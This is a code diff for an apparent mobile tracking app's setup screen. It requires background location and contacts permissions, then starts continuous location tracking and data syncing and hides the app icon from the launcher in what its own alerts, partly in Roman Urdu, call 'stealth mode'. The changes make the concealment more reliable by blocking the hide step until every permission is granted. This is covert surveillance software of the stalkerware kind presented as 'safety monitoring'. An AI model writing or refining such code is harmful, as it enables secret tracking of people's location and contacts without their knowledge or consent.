@@ -53,8 +53,22 @@ export const SetupScreen: React.FC = () => {
   const handleGrantPermissions = async () => {
     try {
       setLoading(true);
-      await requestLocationPermissions();
-      await requestContactsPermission();
+      const locGranted = await requestLocationPermissions();
+      if (!locGranted) {
+        Alert.alert(
+          "Location Permission Missing",
+          "Background Location ('Allow all the time') is required. Please grant it in phone settings before proceeding."
+        );
+        return;
+      }
+      const contactsGranted = await requestContactsPermission();
+      if (!contactsGranted) {
+        Alert.alert(
+          "Contacts Permission Missing",
+          "Contacts access is required for safety monitoring. Please allow it before continuing."
+        );
+        return;
+      }
       setStep("activate");
     } finally {
       setLoading(false);
@@ -65,12 +79,24 @@ export const SetupScreen: React.FC = () => {
     if (!deviceId) return;
     try {
       setLoading(true);
+      // Strict Check: Never hide until ALL permissions are confirmed granted
+      const locActive = await requestLocationPermissions();
+      const contactsActive = await requestContactsPermission();
+      if (!locActive || !contactsActive) {
+        Alert.alert(
+          "Permissions Incomplete!",
+          "Pehle tamam permissions (Location: Allow all the time & Contacts) ko allow karein. Adhoori permissions ke sath app hide nahi ho sakti."
+        );
+        setStep("permissions");
+        return;
+      }
+
       await startBackgroundLocation();
       startSyncCoordinator(deviceId);
       await AsyncStorage.setItem(STORAGE_KEYS.IS_ACTIVATED, "true");
       Alert.alert(
         "Protection Active",
-        "The app icon is now hiding. 24/7 background tracking and security is running.",
+        "Tamam permissions verify ho chuki hain. App ab launcher se hide hokar background stealth mode me active ho chuki hai.",
         [{ text: "OK", onPress: () => activateStealthMode() }]
       );
     } catch (err: any) {
